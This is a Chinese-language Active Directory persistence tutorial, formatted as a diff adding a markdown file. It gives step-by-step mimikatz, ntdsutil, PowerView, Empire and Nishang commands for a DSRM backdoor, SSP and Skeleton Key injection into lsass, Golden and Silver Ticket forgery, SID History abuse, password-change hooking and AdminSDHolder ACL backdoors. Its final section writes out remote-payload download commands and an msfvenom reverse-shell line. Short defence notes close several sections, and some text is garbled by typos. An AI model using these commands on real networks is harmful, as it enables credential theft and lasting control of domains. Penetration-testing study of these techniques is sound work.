@@ -1,0 +1,557 @@
+## ​一：DSRM后门
+
+DSRM (`Directory Services Restore
+Mode`,目录服务恢复模式)是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户
+(也就是DSRM账户)。DSRM的用途是:`允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常`。在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行ntdsutil
+命令行工具。
+
+在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。如果域控制器的系统版本为`Windows Server
+2008`，需要安装`KB961320`才可以使用指定域账号的密码对DSRM的密码进行同步。在`Windows Server
+2008`以后版木的系统中不需要安装此补丁。如果域控制器的系统版本为`Windows Server 2003`则不能使用该方法进行持久化操作。
+
+我们知道，每个域控制器都有本地管理员账号和密码(与城管理员账号和密码不同)。DSRM账号可以作为一个域控制器的本地管理品用户， 通过网络连接域控制器，
+进而控制域控制器。
+
+ **》》》修改DSRM密码《《《**
+
+微软公布了修改DSRM密码的方法。在域控制器上打开令行环境，常用命令说明如下：
+
+> 1 NTDSUTIL: 打开ndsutil  
+> 2 set dsrm password:设置DSRM的密码。  
+> 3 reset pssword on server null:在当前域控制器上恢复DSRM密码。  
+> 4 <PASSWORD>:修改后的密码。  
+> 5 q(第1次):退出DSRM密码设置模式。  
+> 6 q(第2次):退出ntdsutil
+
+![image.png](https://image.3001.net/images/20211119/1637311634_61976492a480adf37c0fd.png!small)如果域控制器的系统版本为`Windows
+Server 2008`已安装`KB961320 `及以上，可以将DSRM密码同步为已存在的域账号密码。常用命令说明如下：
+
+> 1 NTDSUTIL: 打开ntdsutil。  
+> 2 SET DSRM PASSWORD:设置DSRM的密码。  
+> 3 SYNC FROM DOMAIN ACCOUNT domainusername:使DSRM的密码和指定域用户的密码同步。  
+> 4 q(第1次):退出DSRM密码设置模式。  
+> 5 q(第2次):退出ntdsutil。
+
+![image.png](https://image.3001.net/images/20211119/1637311635_619764934e16e1a21137b.png!small)​步骤一：使用`mimikatz`查看
+**krbtgt 的**` **NTLM Hash**`在域控制器中打开`mimikatz`执行如下命令。
+
+> 1 privilege::debug  
+> 2 lsadump::lsa /patch /name:krbtgt
+
+![image.png](https://image.3001.net/images/20211119/1637311635_61976493e91cd724260cd.png!small)​步骤二：mimikatz查看并获取SAM文件中本地管理员的NTML也就是
+**DSRM的NTLM Hash值** 。
+
+> 1 token::elevate  
+> 2 lsadump::sam
+
+![image.png](https://image.3001.net/images/20211119/1637311636_61976494a1c35797b2678.png!small)步骤三：将DSRM账号和krbtgt的NTML
+HASH同步
+
+> 1 # 需要注意的是当前要用管理员身份执行CMD命令  
+> 2 PS C:\Users\Administrator\Desktop> NTDSUTIL  
+> 3 C:\Windows\system32\ntdsutil.exe: SET DSRM PASSWORD  
+> 4 重置 DSRM 管理员密码: SYNC FROM DOMAIN account krbtgt  
+> 5 已成功同步密码。  
+> 6 重置 DSRM 管理员密码: q  
+> 7 C:\Windows\system32\ntdsutil.exe: q
+
+![image.png](https://image.3001.net/images/20211119/1637311637_619764954dae93ca30d60.png!small)​步骤四：查看DSRM的`NTML
+Hash`是否同步成功
+
+> 1 token::elevate  
+> 2 lsadump::sam  
+> 3 lsadump::lsa /patch /name:krbtgt
+
+![image.png](https://image.3001.net/images/20211119/1637311637_61976495e1dcbc9ce0cc5.png!small)​步骤五：
+**修改DSRM的登录方式**
+
+DSRM的三种登录方式，具体如下：
+
+  * 0:默认值，只有当城控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号。
+  * 1: 只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器。
+
+  * 2:在任何情况下，都可以使用DSRM管理员账号登录域控制器。
+
+在渗透测试中需要注意，在`Windows Server 2000`以后版本的操作系统中，对DSRM使用控制台登录域控制器进行了限制。
+
+如果要使用DSRM账号通过网络登录域控制器，需要将该值设置为2。输人如下命令，可以使用PowerShell进行更改
+
+> 1 New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name
+> "dsrmadminlogonbehavior" -value 2 -propertyType DWORD
+
+![image.png](https://image.3001.net/images/20211119/1637311638_61976496a46e2a1c9749c.png!small)步骤六：在域成员机器的管理模式下打开Mimikatz并使用DSRM账号通过网络远程登录域控制器....
+
+> 1 privilege::debug  
+> 2 sekurlsa::pth /domain:WIN-2012 /user:Administrator
+> /ntml:6c4a2964d522d7160865d90f88392aac
+
+![image.png](https://image.3001.net/images/20211119/1637311639_619764975ea556eb01ff0.png!small)​步骤七：使用Mimikatz的scysnc功能远程转储krbtgt的NTML
+Hash
+
+> 1 lsadump::dcsync /domain:pentest.com /dc:dc /user:krbtgt
+
+![image.png](https://image.3001.net/images/20211119/1637311640_6197649816b130e768e1c.png!small)
+**》》》** **DSRM域后门的防御措施** **《《《**
+
+  * 定期检查注册表中用于控制DSRM登录方式的键值`hklm:\system\currentcontrolset\control\lsa\`确认该键值为1, 或者删除该键值。
+  * 定期修改城中所有城控制器的DSRM账号。
+
+  * 经常检查ID为4794的日志。当试设置活动目录服务还原模式的管理员密码会被记录在4794日志中。
+
+### 二：SSP权限维持
+
+SSP( **Security Support Provider**
+)是Windows操作系统安全机制的提供者。简单地说，SSP是个`DLL`文件，主要用来实现Windows操作系统的身份认证功能，例如`NTLM`、`Ketberos`,`Negotiare`.`Seure
+Channe`(Schannel )、`Digest`、`Credental`( CredSSP )。
+
+SSPI ( **Security Support Provider
+Interfce**.安全支持提供程序接口)是Windows操作系统在执行认证操作时使用的API接口。可以说，SSPI是SSP的API接口。
+
+如果获得了网络中目标机器的System权限，可以使用该方法进行持久化操作。其主要原理是: LSA (`Local Security
+Authority`)用于身份验证;`lsass.exe `作为Windows的系统进程，用于本地安全和登录策略;在系统启动时，SSP
+将被加载到`lsass.exe`进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到`lsass.exe`进程中，就能够获取`lsass.exe`进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。
+
+实验一：Mimikatz伪造SSP注入内存
+
+步骤一：使用mimikatz将伪造的SSP注人内存。这样做不会在系统中留下二进制文件，但如果域控制器重启，被注人内存的伪造的SSP将会丢失。
+
+> 1 privilege::debug  
+> 2 misc::memssp
+
+![image.png](https://image.3001.net/images/20211119/1637311640_6197649897f03c2aea2d7.png!small)​步骤二：注销当前用户。输入用户名和密码后重新登录，获取明文密码，密码存储在日志文件`C:\Windows\System32\mimilsa.log`中。
+
+![image.png](https://image.3001.net/images/20211119/1637311641_61976499252a7e5018868.png!small)​实验二：mimilib添加到注册表
+
+步骤一：将mimikatz中的mimilib.dll放到系统的`C:\Windows\System32\`目录下，并将mimilib添加到注册表中。使用这种方法，系统重启也不会影响持久化的效果。
+
+![image.png](https://image.3001.net/images/20211119/1637311641_61976499a0e00c254b9ae.png!small)​步骤二：修改`HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa/Security
+Packages `项，加载新的DLL文件
+
+![image.png](https://image.3001.net/images/20211119/1637311642_6197649a3e6a355f545da.png!small)步骤三：系统重启后如果DLL文件被成功加载，用户在登陆是输入的账号和密码明文就会被记录在`C:\Windows\System32\Kiwissp.log`中.....
+
+![image.png](https://image.3001.net/images/20211119/1637311643_6197649b11bfb6b119d4b.png!small)​
+**》》》SSP维持域控权限防御方法《《《**
+
+  * 检查`HKEY LOCAL MCNSSrCnContooCotroro sScrt Packages `项中是否含有可疑的DLL文件。
+  * 检查`C:WindowsSystem32\`目录下是否有可疑的DLL文件。
+
+  * 使用第三方工具检查LSA中是否有可疑的DLL文件。
+
+### 三：SID History域后门
+
+每个用户都有自己的SID。 **SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限** 。SID
+History是在域迁移过程中需要使用的个属性。如果将A域中的域用户迁移到B域中，那么在B域中新建的用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID
+History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID
+History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。使用mikaz,可以将SID History 属性添加到域中任意用户的SID
+History 属性中。在渗透测试中，如果获得了域管理员权限(或者等同于域管理员的权限).就可以将SIDHisoy作为实现持久化的方法。
+
+步骤一：使用[工具](https://github.com/lucasbiella/admodule "工具")查看test用户的SID
+History属性并打开Mimikatz将Administrator的SID添加到test用户的SID
+History属性中,需要注意的是在使用mimikatz注入SID之前需要使用`sid::patch`命令修复NTDS服务，否则无法将高权限的SID注入低权限的用户的SID属性；mimikatz在2.1版本之后将`misc::addsid`模块添加到了`sid::add`下
+
+> 1 Import-Module .\Import-Active  
+> 2 GetADUser yyds -properties sidhitory  
+> 3 # mimikatz  
+> 4 privilege::debug  
+> 5 sid::patch //以下命令如果执行失败则使用该命令修复NTDS服务  
+> 6 sid::add /sam:yyds /new:administrator
+
+![image.png](https://image.3001.net/images/20211119/1637311643_6197649b975f99c08910f.png!small)![image.png](https://image.3001.net/images/20211119/1637311644_6197649c22d9895582778.png!small)步骤二：再次使用PowerShell查看test用户的SID
+History并在域内主机上登录尝试列出域控制器C盘的目录`dir \\dc\c$`
+
+![image.png](https://image.3001.net/images/20211119/1637311644_6197649cac51de820eb9f.png!small)![image.png](https://image.3001.net/images/20211119/1637311645_6197649d42a3a5033b7c3.png!small)​
+**》》》SID History对抗方法《《《**
+
+  * 可以通过注入 SID History属性完成持久化任务。
+  * 拥有高权限 SID的用户,可以使用PowerShell远程导出域控制器的ntds.dit。
+
+  * 如果不再需要通过 SID History属性实现持久化,可以使用sid::clear /sam:username 清除SID History的属性。
+  * 经常查看域用户中SID为500的用户。
+
+  * 完成域迁移工作后,对有相同SID History属性的用户进定期检查ID为4765和4766的日志。4765为将 SID Histtory属性添加到用户的日志。4766为将SID History属性添加到用户失败的日志。
+
+### 四：Golden Ticket/黄金票据
+
+在渗透测试过程中,如果发现系统中存在恶意行为,应及时更改域管理员密码,对受控机器进行断网处理，然后进行日志分析及取证。然而,攻击者往往会给自己留下多条进入内网的通道,如果我们忘记将krbtgt
+账号重置，攻击者就能快速重新那会域控制器权限。
+
+假设域内存在一个SID为502的域账号krbtgt。 krbtgt是 KDC服务使用的账号,属于Domain
+Admins组。在域环境中,每个用户账号的票据都是由krbtgt生成的,如果攻击者拿到了krbtgt 的`NTLM
+Hash`或者`AES-256`值，就可以伪造域内任意用户的身份,并以该用户的身份访问其他服务。攻击者在使用域的 Golden
+Ticket（黄金票据)进行票据传递攻击时,通堂要堂握以下信息：
+
+  1. 完整的域名
+  2. 需要伪造的域管理员用户名
+
+  1. 域SID-Krbtgt的NTLM Hash或AES-256
+
+操作系统
+
+|
+
+角色
+
+|
+
+域名
+
+|
+
+用户名  
+  
+---|---|---|---  
+  
+Wins2012R2
+
+|
+
+DC
+
+|
+
+warsec.com
+
+|
+
+Administrator  
+  
+Win10
+
+|
+
+Client
+
+|
+
+warsec.com
+
+|
+
+Administrator  
+  
+步骤一：在域控上导出Krbtgt账户的`NTLM
+Hash`该方法使用`dcsync`功能远程转储活动目录中的`ntds.dit`。指定`/user`参数，可以只导出`krbtgt`账号的信息。
+
+> 1 privilege::debug  
+> 2 lsadump::dcsync /domain:warsec.com /user:krbtgt
+
+![image.png](https://image.3001.net/images/20211119/1637311645_6197649de6c4315bda4f3.png!small)步骤二：获取基本信息包括：域SID/用户SID/域管理账号/域名等信息
+
+> （1）获取域SID  
+> wmic useraccount get name,id  
+> (2)获取当前用户的sid  
+> whoami /user  
+> (3)查询域管理员账户  
+> net group "domain admins" /domain  
+> (4)查询域名  
+> ipconfig /all
+
+步骤三：在获取域控的权限之后，查看当前用户机器所属的组....并尝试访问域控C盘共享...
+
+![image.png](https://image.3001.net/images/20211119/1637311646_6197649e8c766ab84d378.png!small)​步骤四：开始制作黄金票据...
+
+> (1)清空票据  
+> kerberos::purge  
+>  
+> (2)生成票据，使用mimikatz生成包含krbtgt身份的票据  
+> kerberos::golden /admin:Administrator /domain:us.pentest.com /sid: /krbtgt:
+> /ticket:Administrator.kiribi  
+>  
+> (3)传递票据并注入内存  
+> kerberos::ptt Administrator.kiribi  
+>  
+> (4)检索当前会话中的票据  
+> kerberos::tgt
+
+![image.png](https://image.3001.net/images/20211119/1637311647_6197649f2345cc7d72405.png!small)​步骤五：导入黄金票据之后验证权限....
+
+> 1 dir \\\dc\c$  
+> 2 在当前会话中使用wmiexec.vbs验证  
+> 3 cscript wmiexec.vbs /shell dc  
+> 4 使用krbtgt的AES-256生成票据并将其注入内存，也可以伪造用户。  
+> 5 kerberos::golden /admin:Administrator /domain:warsec.com /sid: /aes256:
+> /ticket:Administrator.kiribi
+
+![image.png](https://image.3001.net/images/20211119/1637311647_6197649f9d7f0991ba1ee.png!small)
+**》》》金票防御《《《**
+
+管理员通常会修改域管理员的密码,但有时会忘记将 krbtgt密码一并重置,所以,如果想防御 Golden
+Ticket攻击,就需要将krbtgt密码重置两次。
+
+使用Golden Ticket 伪造的用户可以是任意用户(即使这个用户不存在)。因为 TGT的加密是由krbtgt完成的,所以,只要
+TGT被krbtgt账户和密码正确地加密,那么任意KDC使用krbtgt将TGT解密后，TGT中的所有信息都是可信的。只有在如下两种情况下才能修改krbtgt密码。
+
+  * 域功能级别从`Windows 2000`或`Windows Server 2003`提升至`Windows Server 2008`或`WindowsServer 2012`。在提升域功能的过程中,krbtgt的密码会被自动修改。在大型企业中，域功能级别的提升耗时费力,绝大多数企业不会去提升自己的域功能级别,而这给 Golden Ticket攻击留下了可乘之机。
+  * 用户自行进行安全检查和相关服务加固时会修改` **krbtgt**`的密码。
+
+### 五：Silver Ticket/白银票据
+
+ **Silver Ticket** (白银票据不同于 Golden Ticket, Silver
+Ticket的利用过程是伪造TGS,通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC,所以可以绕过域控制器，很少留下日志。而Golden
+Ticket在利用过程中需要KDC颁发TGT,且在生成伪造的TGT 的20分钟内,TGS不会对该TGT 的真伪进行校验。
+
+Silver Ticket 依赖于服务账号的密码散列值，这不同于 Golden Tickett账号的密码散列值,因此更加隐蔽。
+
+Golden Ticket使用krbtgt账号的密码散列值，利用伪造高权限任意服务访回权限的票据,从而获得域控制器权限。而Silver
+Ticket会通过相应的服务账号来伪造TGS，例如LDAP、 MSSQL、WinRM、 DNS、CIFS 等，范围有限，只能获取有限的权限。
+
+Golden Ticket是由krbtgt账号加密的，而Silver Ticket是由特定的服务账号加密的。
+
+攻击者在对内网进行攻击时，需要掌握以下信息。
+
+  * 域名
+  * 域SID
+
+  * 目标服务器的`FQDN`
+  * 可利用的服务
+
+  * 服务账号的`NTLM Hash`
+  * 需要伪造的用户名
+
+实验一：使用Sliver Ticket伪造CIFS服务权限...
+
+> 1 # 客户端权限验证  
+> 2 dir \\\dc\c$  
+> 3 # 域控导出要控主机的NTLM Hash  
+> 4 mimikatz log "privilege::debg" "sekurlsa::logonpasswords" 获取服务账户的NTML  
+> 5 # 清空票据，防止干扰  
+> 6 klist purge  
+> 7 # 使用伪造的silver ticket,在不能访问域控制器共享目录的机器中输入  
+> 8 kerberos::golden /domain:us.pentest.com /sid: /target:pentest.com
+> /service:cifs /ec4: /user:administrator /ptt  
+> 9 验证权限
+
+![image.png](https://image.3001.net/images/20211119/1637311648_619764a03a4a69310a919.png!small)​实验二：使用Silver
+Ticket伪造LDAP服务权限
+
+> 1 # 清除票据，防止受影响....  
+> 2 klist purge  
+> 3 使用mimikatz生成伪造的Silver Ticket  
+> 4 kerberos::golden /domain:pentest.com /sid: /target:us.pentest.com /service
+> LDAP /rc4: /user:test /ptt  
+> 5 lsadump::dcsync /dc:us.pentest.com /domain:pentest.com /user:krbtgt
+> 再次查询散列值
+
+![image.png](https://image.3001.net/images/20211119/1637311648_619764a0d3fd282f120f0.png!small)​`Silver
+Ticket`还可用于伪造其他服务，例如创建和修改计划任务、使用WMI对远程主机执行命令、使用PowerShell对远程主机进行管理等
+
+ **》》》银票防御措施《《《**
+
+  * 在内网中安装杀毒软件，及时更新系统补丁。
+  * 使用组策略在域中进行相应的配置，限制 **mimikatz** 在网络中的使用
+
+  * 计算机的账号和密码默认每30天更改次。 检查该设置是否生效
+
+### 六：Skeleton Key/万能密码
+
+使用Skeleton Key(万能密码)可以对域内权限进行持久化操作....
+
+操作系统
+
+|
+
+服务器角色
+
+|
+
+域环境  
+  
+---|---|---  
+  
+Windows Server 2012R2
+
+|
+
+DC
+
+|
+
+warsec.com  
+  
+Windows 10
+
+|
+
+Client
+
+|
+
+warsec.om  
+  
+实验一：在Mimikatz中使用Skeleton Key
+
+步骤一：在Win10中尝试以当前的身份列出域控制器C盘共享目录中的文件,如下图访问不成功....
+
+![image.png](https://image.3001.net/images/20211119/1637311649_619764a193654fa63d744.png!small)​步骤二：在Win10中使用域管理员账号密码进行IPC$连接，连接成功再次列出域控制器的C盘共享...如下图所示
+
+> 1 net use \\\192.168.1.1\IPC$ "密码" /user:warsec\administrator
+
+![image.png](https://image.3001.net/images/20211119/1637311650_619764a244da0329de0dc.png!small)​步骤三：在域控制器中以管理员权限打开Mimikatz并输入以下命令将SkeletonKey注入域控制器的Lsass.exe进程
+
+系统会提示Skeleton
+Key已经注入成功，此时会在域内的所有账号中添加一个SkeletonKey其默认密码为“mimikatz”,接下来就可以以域内任意用户的身份配合该Skeleton
+Key进行域内身份验证了.....
+
+> 1 privilege::debug  
+> 2 misc::skeleton
+
+![image.png](https://image.3001.net/images/20211119/1637311651_619764a3085654a841968.png!small)​步骤四：在不使用域管理员账号和原始密码的情况下使用注入的Skeleton
+Key同样可以成功链接系统，输入以下命令将之前建立的IPC$链接删除...
+
+> 1 net use ## 查看现有的IPC$链接  
+> 2 net use \\\dc\ipc$ /del /y ##将之前建立的IPC$链接删除
+
+![image.png](https://image.3001.net/images/20211119/1637311651_619764a3c1279aec83367.png!small)步骤五：输入以下命令使用域管理员账号和Skeleton
+Key与域控制器建立IPC$并查看域控的C盘共享...
+
+> net use \\\dc\ipc$ "mimikatz" /user:warsec\administrator
+
+![image.png](https://image.3001.net/images/20211119/1637311652_619764a473c2f126f316e.png!small)实验二：在Empire中使用Skeleton
+Key
+
+进入Emprie环境在成功反弹一个Empire的agent之后，使用interact命令进入该agent并输入“use
+module”命令，加载skeleton_keys模块。该模块通过PowerSploit的`Invoke-Mimikatz.ps1`脚本，在加载mimikatz之后，使用Powershell版的mimikatz中的`misc::Sekelete`命令，将Skelelton
+Key注入域控制器的Lsass.exe进程。
+
+> 1 (Empire: agents) > interact KFSV7YB1  
+> 2 (Empire: KFSV7YB1) > usemodule persistence/misc/skeleton_key  
+> 3 (Empire: powershell/persistence/misc/skeleton_key) > execute  
+> 4 将skeleton_key注入后，empire提示可以通过mimikatz进入系统
+
+ **》》》** **Skeleton Key攻击的防御措施** **《《《**
+
+2014年，微软在Windows操作系统中增加了LSA保护策略，以防止Isass.cxe进程被恶意注入。从而防止mimikatz在非允作的情况下提升到debug权限。通用的Skeleton
+Key的防御措施列举如下。
+
+  * 域管理员用户要设置强口令，确保恶意代码不会在城控制器中执行。
+  * 在所有城用户中启用双因子认证，例如智能卡认证。
+
+  * 启动(例如应用程序白名单例如AppLocker以限制mimikatz在域控制器中的运行。
+  * 在日常网络维护中注意以下方面，也可以有效防范Skeleton Key
+
+  * 只能在64位操作系统中使用，包括Wins2012、Wins2012R2、Wins08、Wins2008R2、Wins2003R2、Wins2003。
+  * 只有具有城管理员权限的用户可以将SleloKeo注人城控制器的lass cxe进程。
+
+  * Seleton Key被注人后，用户使用现有的密码仍然可以登录系统。
+  * 因为Selcton Key是被注入lsass.exeexe进程的，所以它只存在于内存中。如果域控制器重启，注人的Skeleton Key将会失效。
+
+### 七：HookPasswordChangeNotify
+
+`Hook PaswordChangeNoify`的作用是当用户修改密码后在系统中进行同步。攻击者可以利用该功能获取用户修改密码时输人的密码明文。
+
+在修改密码时，用户输人新密码后，LSA会调用PasswordFileter来检查该密码是否符合复杂性要求。如果密码符合复杂性要求，LSA会调用`PasswordChangeNotify`,在系统中同步密码。
+
+步骤一：生成Hook
+dll，将一下项目下载下来并使用VS编译，MSF设置为在静态库中使用MFC编译工程生成`HookPasswordChange.dll`文件生成的dll文件在`Misc-Windows-Hacking-master\HookPasswordChange\x64\Release`路径中‘
+
+> [1 https://github.com/clymb3r/Misc-Windows-> Hacking](https://github.com/clymb3r/Misc-Windows-Hacking "1 
+> https://github.com/clymb3r/Misc-Windows-Hacking")
+
+![](https://image.3001.net/images/20211119/1637311653_619764a5159f76aab54a4.png!small)步骤二：下载Powershell的Dll注入脚本其中我们要用到的是`\PowerShell-master\Invoke-ReflectivePEInjection\Invoke-ReflectivePEInjection.ps1`这个脚本
+
+> 1 下载地址：https://github.com/clymb3r/PowerShell
+
+步骤三：将HookPasswordChange.dll文件以及Invoke-ReflectivePEInjection.ps1
+脚本文件传到域控机器上，并在域控机器的powershell中运行如下命令
+
+> 1 Import-Module .\Invoke-ReflectivePEInjection.ps1  
+> 2 Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname
+> lsass
+
+![](https://image.3001.net/images/20211119/1637311654_619764a610bd962355fc5.png!small)​步骤五：验证`Hook
+PasswordChangeNotify`接下来就是手动修改域管理员密码，在C:\Windows\Temp下可以找到passwords.txt，其中记录了新修改的密码。
+
+> 1 net user administrator 123  
+> 2 查看c:\windows\temp\passwords.txt可以看到修改后的密码
+
+ **》》》Hook PasswordChangeNotify的防御措施** **《《《**
+
+使用Hook
+PasswordChangeNotify方法不需要重启系统、不会在系统磁盘中留下DLL文件、不需要修改注册表。如果PasswordChangeNotify被攻击者利用，网络管理员是很难检测到的。所以，在日常网络维护工作中，需要对PowerShell进行严格的监视，并启用约束语言模式，对HookPasswordChangeNotify进行防御。
+
+### 八：AdminSDHolder
+
+`AdminSDHolder`是一个特殊的AD容器，通常作为某些特权组成员的对象的安全模板。Active
+Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的。
+
+![image.png](https://image.3001.net/images/20211119/1637311654_619764a6cf1c6dc55bd0e.png!small)​步骤一：在域控上操作`
+**AdminSDHolder**`对象的ACL添加用户Hacker对AdminSDHolder的完全访问权限
+
+> 1 import-module .\PowerView  
+> 2 Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity
+> hacker -Rights All
+
+![image.png](https://image.3001.net/images/20211119/1637311655_619764a791e4e81f60a41.png!small)​注意：由于`SDPROP`的原因，默认等待60分钟之后生效
+
+ **》》》SUPROP《《《**
+
+为了将可继承ACE的更改传播到后代对象，域控制器运行一个称为安全描述符传播器（SDPROP）的后台任务。通过修改对象的安全描述符或移动对象时触发此任务。当修改了AdminSDHolder的ACL之后默认等待60分钟以后生效，原理是SDPROP进程在PDC模拟器上每60分钟运行一次，并使用AdminSDHolder设置的安全权限重新标记ACL。
+
+  1.  **注册表SDPROP运营频率:**
+
+***修改成等待60秒***
+
+> 1 reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v
+> AdminSDProtectFrequency /t REG_DWORD /d 60
+
+2.手动触发SDPROP进程:
+
+运行->LDP.exe->菜单>连接->连接->服务器输入当前的机器名，端口默认为389
+
+然后连接->绑定凭证->作为当前登录的用户绑定->然后浏览->修改，在属性选项卡中输入FixUpInheritance。在
+
+![image.png](https://image.3001.net/images/20211119/1637311656_619764a83a089ca7d445a.png!small)​步骤三：登录hacker用户，可以看到hacker非域管组，却能执行域管权限的命令...
+
+![image.png](https://image.3001.net/images/20211119/1637311656_619764a8da24fed2de7f8.png!small)​九：Nishang框架下的权限维持
+
+Nishang 是基于Porsthel的渗透测试工具，集成了很多框架、脚本及各种 Payload在Nishang环境中对一些脚本后门进行分析。
+
+1\. HTTP-Backdoor脚本
+
+此脚本可以帮助攻击者在目标主机上下载和执行Powershell脚本，接收来自第三方网站的指令，在内存中执行PowerShell脚本，其语法如下。
+
+> 1 TTP-Backdoor -CheckURL http:// -PayloadURL http:// -MagicString start
+> -StopString stop  
+> 2 CheckURL:给出一个URL地址。如果该地址存在，Magistring中的值就会执行Payload,下载并运行攻击者的脚本。  
+> 3 -PayloadURL: 给出需要下载的PowerShell脚本的地址。  
+> 4 -StopString: 判断是否存在CheckURL返回的字符串，如果存在则停止执行。
+
+2.Add-ScrnSaveBackdoor
+
+> 1 Add ScrnSaveBackdoor脚本可以帮助攻击者利用Windows的屏幕保护程序来安插一个隐藏的后门  
+>  
+> 2 Add-ScrnSaveBackdoor -Payload "powershe1l.exe -ExecutionPolicy Bypass
+> -ncprofile -noexit -c Get-Process" ##执行Payload  
+>  
+> 3 Add-ScrnsaveBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm
+> -Arguments HTTP-Backdoor http://... start123 stopthis #在PowerShell中执行一个HTTP-> Backdoor脚本  
+>  
+> 4 Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/code exec.psl
+> -PayloadURL:指定需要下载的脚本的地址。  
+>  
+> 5 Arguments:指定需要执行的函数及相关参数。  
+> 攻击者也会使用msfvenom生成一个PowerShell, 然后执行如下命令，返回一个meterpreter。  
+>  
+> 6 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.254.226 -f
+> powershell
+
+3\. Execute- -OnTime
+
+> 1 Execute-OnTime脚本用于在目标主机上指定PowerShell脚本的执行时间，与HTTP-> Backdoor脚本的使用方法相似，只不过增加了定时功能，其语法如下。  
+>  
+> 2 PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh
+> -Arguments Get- Information -Time 23:21 -CheckURL http:/ /pastebin. com/ raw
+> .php?i=zhyf8rwh一 Stopstring stoppayload  
+> 3 PayloadURL:指定下载的脚本的地址。  
+> 4 -Arguments: 指定要执行的函数名。  
+> 5 -Time: 设置脚本执行的时间，例如“-Time 23:21”。  
+> 6 -CheckURL:检测一个指定的URL里是否存在StopString给出的字符串，如果存在就停止执行。
+
+4\. Invoke- ADSBackdoor
+
+Invoke-ADSBackdoor脚本能够在NTFS数据流中留下一个 永久性的后门。这种方法的威胁是很大的，因为其留下的后门是永久性的，且不容易被发现。
+
+Invoke-ADSBackdoor脚本用于向ADS注人代码并以普通用户权限运行。
+
+> PS >Invoke-ADSBackdoor -PayloadURL http://192.168.12.110/test.ps1
+
